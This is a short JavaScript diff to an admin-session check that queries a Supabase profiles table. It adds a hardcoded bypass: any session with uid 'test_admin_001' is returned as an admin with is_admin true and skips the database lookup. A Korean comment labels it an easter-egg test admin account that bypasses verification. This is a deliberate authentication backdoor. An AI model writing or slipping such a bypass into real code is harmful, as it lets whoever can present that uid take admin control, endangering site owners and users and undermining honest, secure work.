@@ -11,6 +11,15 @@ async function requireAdminSession(req) {
     return { ok: false, statusCode: 401, message: 'Login session is required.' };
   }
 
+  // 이스터에그 테스트 관리자 계정은 검증 우회
+  if (session.uid === 'test_admin_001') {
+    return {
+      ok: true,
+      session,
+      profile: { id: 'test_admin_001', is_admin: true, name: '테스트 관리자' }
+    };
+  }
+
   const rows = await fetchSupabase(
     `/rest/v1/profiles?select=id,is_admin&id=eq.${encodeEq(session.uid)}&limit=1`,
     { headers: { Accept: 'application/json' } }
